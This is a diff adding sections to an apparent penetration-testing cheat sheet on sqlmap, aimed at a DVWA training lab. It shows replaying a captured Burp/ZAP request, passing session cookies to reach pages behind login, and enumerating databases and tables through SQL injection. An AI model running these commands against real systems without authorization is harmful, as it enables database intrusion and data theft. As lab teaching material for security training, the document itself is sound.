@@ -478,4 +478,63 @@ sqlmap -u "http://sqli.org/" --forms --crawl=2
 ```
 
 * This will allow it to spider the page at a depth of two and attempt injection on any identified injection points
-*
+
+#### Sqlmap with Burp/Zap Request
+
+* Capture a request in which you provide input to the form box that you want tested in either zap or burp.
+* Save off that request with all the headers to your local attack box
+
+```
+GET https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Connection: close
+Accept: */*
+User-Agent: sqlmap/1.6.6.4#dev (https://sqlmap.org)
+Host: dvwa.sec542.org
+Cookie: PHPSESSID=lj1gugoprduur56u8lml5q373c; security=low
+Cache-Control: no-cache
+```
+
+* Now feed that file into sqlmap&#x20;
+
+```
+sqlmap -r burp.request --batch
+```
+
+#### Authentication with Sqlmap
+
+* If you are able to login to a webserver via credentials or another means, and you want sqlmap to test parameters that are only accessible past the login page, you need to figure out how the application is conducting session management.
+* More often than not it is with a cookie
+* Capture ALL of the cookies in the request like this:
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* Now with your cookies in your clipboard buffer add them into your command
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lj1gugoprduur56u8lml5q373c; security=low"  --batch
+```
+
+#### Enumerating the Databases with Sqlmap
+
+* Once sqlmap has identified a vulnerability, and you want to enumerate all the databases use:
+* `--dbs`
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="COOKIE VALUE" --dbs
+```
+
+#### Enumerating the Tables in a Database
+
+* Once you are able to dump the database names with sqlmap, now enumerate the tables in your database of interest&#x20;
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+* Say we want the tables out of the `sqli` database
+
+```
+sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="COOKIE VALUE" -D sqli --tables
+```
+
+* Output should look something like this:
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
